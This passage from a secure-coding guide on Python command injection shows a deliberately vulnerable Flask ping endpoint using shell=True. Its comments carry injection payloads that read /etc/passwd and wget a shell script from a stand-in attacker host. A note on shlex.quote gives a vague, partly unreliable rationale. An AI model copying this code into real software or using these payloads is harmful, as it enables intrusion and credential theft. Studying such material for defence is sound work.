---
source: "languages/python/command-injection.md"
title: "Command Injection — Python"
heading: "Vulnerable Code Example"
category: "language-vuln"
language: "python"
severity: "critical"
tags: [checklist, code, explanation, language-vuln, prevention, python, secure, vulnerability, vulnerable]
chunk: 4/8
---

## Vulnerable Code Example

### Flask Command Runner

```python
# 🚫 VULNERABLE — AI-generated command executor
from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/ping')
def ping():
    target = request.args.get('target')
    # Attacker sends: target=google.com;cat /etc/passwd
    result = subprocess.run(
        f"ping -c 3 {target}",
        shell=True,
        capture_output=True,
        text=True
    )
    return f"<pre>{result.stdout}</pre>"

# Exploitation:
# /ping?target=google.com;id
# /ping?target=$(cat /etc/passwd | base64)
# /ping?target=127.0.0.1;wget http://attacker.com/shell.sh
```

### shlex.quote() Pitfall

```python
# ⚠️ ALSO VULNERABLE — AI using shlex.quote() incorrectly
import shlex
import subprocess

def ping_host(host):
    # AI thinks shlex.quote() makes it safe with shell=True
    safe_host = shlex.quote(host)
    result = subprocess.run(
        f"ping -c 3 {safe_host}",
        shell=True,  # 💥 Still dangerous — shell=True is the root cause
        capture_output=True
    )
    return result.stdout
```

**Why this still fails:** `shlex.quote()` wraps input in single quotes, but `shell=True` can still be vulnerable to injection through other parts of the command string, and `shlex.quote()` has edge cases on Windows and with certain Unicode inputs.

---